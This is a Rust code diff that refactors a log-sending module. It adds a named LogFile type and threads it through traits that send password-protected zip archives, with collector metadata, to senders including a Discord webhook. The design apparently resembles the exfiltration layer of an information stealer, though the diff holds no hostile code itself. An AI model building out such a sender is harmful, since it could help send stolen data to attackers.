@@ -8,8 +8,10 @@ pub mod discord_webhook;
 pub mod fallback;
 
 use alloc::string::String;
+use alloc::sync::Arc;
 use alloc::vec::Vec;
 use collector::Collector;
+use derive_new::new;
 use zip::ZipArchive;
 
 #[derive(Debug)]
@@ -31,6 +33,23 @@ pub enum LogContent {
     ZipArchive(Vec<u8>)
 }
 
+/// Represents a named log file with content.
+#[derive(new, Clone)]
+pub struct LogFile {
+    name: Arc<str>,
+    content: LogContent
+}
+
+impl LogFile {
+    /// Returns a new `LogFile` with the same name but new content.
+    pub fn modify_content(&self, new_content: LogContent) -> Self {
+        Self {
+            name: self.name.clone(),
+            content: new_content,
+        }
+    }
+}
+
 impl From<Vec<u8>> for LogContent {
     fn from(value: Vec<u8>) -> Self {
         LogContent::ZipArchive(value)
@@ -49,14 +68,14 @@ pub trait LogSender: Clone {
     ///
     /// # Parameters
     ///
-    /// - `log_file`: A [`LogContent`] enum representing the log file to send.
+    /// - `log_file`: A [`LogFile`] struct representing the log file to send.
     /// - `password`: An [`Option<String>`] that specifies the password for the archive, if it is password-protected.
     /// - `collector`: A type that implements the [`Collector`] trait, providing log-related metadata or additional context.
     ///
     /// # Returns
     ///
     /// - `Result<(), SendError>`: Returns `Ok(())` if the log was sent successfully, or a [`SendError`] if the operation failed.
-    fn send<P, C>(&self, log_file: LogContent, password: Option<P>, collector: &C) -> Result<(), SendError>
+    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
     where
         P: AsRef<str> + Clone,
         C: Collector;
@@ -81,14 +100,14 @@ pub trait LogSenderExt: LogSender {
     ///
     /// This method automatically extracts the password from the archive if one is set,
     /// and converts the archive into a [`LogContent::ZipArchive`].
-    fn send_archive<A, C>(&self, archive: A, collector: &C) -> Result<(), SendError>
+    fn send_archive<A, C>(&self, name: Arc<str>, archive: A, collector: &C) -> Result<(), SendError>
     where
         A: AsRef<ZipArchive>,
         C: Collector;
 }
 
 impl<T: LogSender> LogSenderExt for T {
-    fn send_archive<A, C>(&self, archive: A, collector: &C) -> Result<(), SendError>
+    fn send_archive<A, C>(&self, name: Arc<str>, archive: A, collector: &C) -> Result<(), SendError>
     where
         A: AsRef<ZipArchive>,
         C: Collector,
@@ -98,6 +117,6 @@ impl<T: LogSender> LogSenderExt for T {
         let password = archive.get_password();
         let archive = archive.create();
 
-        self.send(archive.into(), password, collector)
+        self.send(LogFile::new(name, archive.into()), password, collector)
     }
 }
